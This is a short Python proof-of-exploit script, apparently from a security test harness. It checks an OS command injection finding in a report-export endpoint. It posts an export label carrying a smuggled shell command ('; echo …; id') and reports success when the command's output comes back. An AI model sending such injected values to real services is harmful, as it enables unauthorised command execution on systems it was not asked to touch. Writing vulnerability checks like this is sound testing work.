"""LG-CMDI-001 proof-of-exploit: OS command injection via the SAS report-export label.

Sends an export label with a shell metacharacter to the SAS service's /export. Fires when the
injected `id` runs and its output (uid=...) comes back, which is only possible with
report_archive=on. Hits the SAS service directly. Env: SAS_URL.
"""

import os

from harness import env, http


def fire():
    mark = f"LGCMDI{os.getpid()}"
    reply = http.post_json(f"{env.url('SAS_URL')}/export", {"export_label": f"rpt.lst; echo {mark}; id"})
    output = http.text(reply.json().get("output", ""))
    if mark in output and "uid=" in output:
        return True, "injected command ran -> " + output.replace("\n", " ")
    return False, reply.text
